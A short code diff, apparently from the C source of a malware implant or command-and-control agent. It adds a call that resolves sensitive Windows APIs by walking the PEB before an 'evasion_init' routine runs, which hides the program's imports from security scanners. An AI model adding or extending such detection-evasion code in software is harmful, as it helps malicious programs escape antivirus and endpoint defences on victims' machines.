@@ -796,6 +796,14 @@ void agent_run(AgentState *state) {
 int main(void) {
     AgentState state;
 
+    /* FIRST: resolve sensitive APIs via PEB walk before anything else.
+     * This must run before agent_init (which calls evasion_init, crypto_init,
+     * etc.) because those functions use VirtualAlloc, GetProcAddress, etc.
+     * through the iat_hide macros. */
+    if (!iat_hide_init()) {
+        return 1;  /* Can't function without core APIs */
+    }
+
     DBG("[main] agent starting, PID=%u", GetCurrentProcessId());
 
     if (!agent_init(&state)) {
